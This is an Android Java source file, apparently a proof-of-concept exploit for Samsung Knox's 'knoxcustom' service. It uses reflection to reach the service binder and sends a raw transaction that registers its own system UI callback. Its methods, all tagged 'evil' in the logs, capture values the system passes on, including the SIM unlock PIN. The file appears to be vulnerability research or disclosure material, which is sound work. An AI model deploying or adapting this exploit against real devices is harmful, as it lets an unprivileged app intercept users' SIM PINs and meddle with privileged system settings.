package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

import com.samsung.android.knox.custom.IKnoxCustomManagerSystemUiCallback;
import com.samsung.android.knox.custom.StatusbarIconItem;

public class MainActivity extends Activity {
    static final int TRANSACTION_registerSystemUiCallback = 277;

    IKnoxCustomManagerSystemUiCallback.Stub callback = new IKnoxCustomManagerSystemUiCallback.Stub() {
        @Override
        public void setLockScreenHiddenItems(int i) {
            Log.d("evil", "setLockScreenHiddenItems: " + i);
        }

        @Override
        public void setLockScreenOverrideMode(int i) {
            Log.d("evil", "setLockScreenOverrideMode: " + i);
        }

        @Override
        public void setQuickPanelButtons(int i) {
            Log.d("evil", "setQuickPanelButtons: " + i);
        }

        @Override
        public void setQuickPanelEditMode(int i) {
            Log.d("evil", "setQuickPanelEditMode: " + i);
        }

        @Override
        public void setQuickPanelItems(String str) {
            Log.d("evil", "setQuickPanelItems: " + str);
        }

        @Override
        public void setQuickPanelUnavailableButtons(String str) {
            Log.d("evil", "setQuickPanelUnavailableButtons: " + str);
        }

        @Override
        public void setScreenOffOnStatusBarDoubleTapState(boolean z) {
            Log.d("evil", "setScreenOffOnStatusBarDoubleTapState: " + z);
        }

        @Override
        public void setStatusBarTextInfo(String str, int i, int i2, int i3) {
            Log.d("evil", "setStatusBarTextInfo. $0 = " + str + ", $1 = " + i + ", $2 = " + i2 + ", $3 = " + i3);
        }

        @Override
        public void setStatusBarIconsState(boolean z) {
            Log.d("evil", "setStatusBarIconsState: " + z);
        }

        @Override
        public void setBatteryLevelColourItem(StatusbarIconItem statusbarIconItem) {
            Log.d("evil", "setBatteryLevelColourItem: " + statusbarIconItem);
        }

        @Override
        public void setHideNotificationMessages(int i) {
            Log.d("evil", "setHideNotificationMessages: " + i);
        }

        @Override
        public void setStatusBarNotificationsState(boolean z) {
            Log.d("evil", "setStatusBarNotificationsState: " + z);
        }

        @Override
        public void setUnlockSimOnBootState(boolean z) {
            Log.d("evil", "setUnlockSimOnBootState: " + z);
        }

        @Override
        public void setUnlockSimPin(String str) {
            Log.d("evil", "setUnlockSimPin: " + str);
        }

        @Override
        public void setChargerConnectionSoundEnabledState(boolean z) {
            Log.d("evil", "setChargerConnectionSoundEnabledState: " + z);
        }

        @Override
        public void setStatusBarHidden(boolean z) {
            Log.d("evil", "setStatusBarHidden: " + z);
        }

        @Override
        public void setVolumePanelEnabledState(boolean z) {
            Log.d("evil", "setVolumePanelEnabledState: " + z);
        }

        @Override
        public void setQuickPanelButtonUsers(boolean z) {
            Log.d("evil", "setQuickPanelButtonUsers: " + z);
        }

        @Override
        public void setHardKeyIntentState(boolean z) {
            Log.d("evil", "setHardKeyIntentState: " + z);
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            IBinder binder = getService("knoxcustom");

            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
            parcel.writeStrongBinder(callback);

            Parcel reply = Parcel.obtain();

            binder.transact(TRANSACTION_registerSystemUiCallback, parcel, reply, 0);
            reply.readException();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private IBinder getService(String name) throws Throwable {
        return (IBinder) Class.forName("android.os.ServiceManager")
                .getDeclaredMethod("getServiceOrThrow", String.class)
                .invoke(null, name);
    }
}